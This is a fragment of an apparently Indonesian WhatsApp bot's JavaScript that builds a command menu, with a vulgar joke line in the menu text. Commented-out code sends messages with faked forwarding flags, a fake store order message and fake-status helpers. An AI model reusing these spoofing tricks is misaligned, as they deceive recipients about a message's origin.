			const llol = fs.readFileSync(`./media/xznsenpai.jpeg`)
			rn = process.uptime()
				const textnya = `
==>>Mohon Baca<<==

JANGAN SPAM BOT INI !!..
TETAP DI RUMAH AJA DAN LAKUKAN 3M
1.makan
2.minum
3.MELIHAT MEMEG

=>>JAM<<=

⦿ Jam WIT : ${wit}
⦿ Jam WITA : ${wita}
⦿ Jam WIB : ${jam}
⦿ Hari : ${week} ${weton}
⦿ Kalender : ${date}
⦿Runtime : ${xznsenpai.runtime(rn)}

=>>Pembuat Sticker<<=

1.${prefix}sticker
2.${prefix}toimg

=>>DOWNLOAD<<=

1.${prefix}play
2.${prefix}video
3.${prefix}ytmp4
4.${prefix}ytmp3
5.${prefix}ttnowm
6.${prefix}igdl

=>>YNTKTS<<=

1.${prefix}darkjokes
2.${prefix}lirik
3.${prefix}ytsearch
4.${prefix}pinterest
5.${prefix}playstore
6.${prefix}truth
7.${prefix}dare

=>>HANYA ADMIN<<=

1.${prefix}kick
2.${prefix}add
3.${prefix}group buka/tutup
4.${prefix}welcome

=>>MAKER<<=

1.${prefix}dota
2.${prefix}aov

*Xᴢɴ々Bᴏᴛ*`
fyt2(textnya)*/
//udin.sendMessage(from, llol, image, {quoted: qul, caption: textnya, contextInfo: { forwardingScore: 250, isForwarded: true,  externalAdReply: { title: 'Duta TeyTed Tzy', body: '𐎑⃢BY;🇮🇩𝐱𝐳𝐧𝐬𝐞𝐧𝐩𝐚𝐢🇮🇩☙', sourceUrl: `https://wa.me/6282256080304?text=Assalamualaikum`, thumbnail: fs.readFileSync('./media/loli.jpeg') }}})
//udin.sendMessage(from, llol, image, {quoted: qul, caption: textnya, contextInfo:{"externalAdReply":{"title": `${ucapanWaktu} ${pushname}`, mediaType: 2, "thumbnailUrl": "https://telegra.ph/file/6b0259fd741e108910fbe.jpg","previewType": "VIDEO","mediaUrl": `https://youtu.be/5odMRQDrhoI`}}})
/*res = await udin.prepareMessageFromContent(from, {
					"orderMessage": {
						"orderId": "792749621388119",
						"sellerJid": "6282255794209@s.whatsapp.net",
						"thumbnail": fs.readFileSync('./media/xznsenpai.jpeg'),
						"itemCount": 99,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${textnya}`,
						"orderTitle": "𝙓𝙕𝙉 𝙎𝙀𝙉𝙋??𝙄",
						"token": "AR7lxB+W/oR81b6ENZgc3dQdr+XrCDQptYJnZEKf3oWcBg=="
						 },
                "contextInfo": {
               "forwardingScore": 3,
               "isForwarded": true
                }
                }, {quoted:fgclink, contextInfo:{}}) 
                udin.relayWAMessage(res)*/
                //replyy(textnya)
                //xznsenpai.FakeTokoForwarded(from, textnya, fake)
                //xznsenpai.sendFakeStatusWithImg(from, lord, textnya, fake)
				//break
/*api gw sendiri*/
/*case 'button':
	send3Button(`Ini contoh buttonsMessage`, `:v`, `Menu Bot`, `${prefix}menu`, `Tes Speed`, `${prefix}ping`, `Cek Runtime`, `${prefix}runtime`, { quoted: qul })
	break*/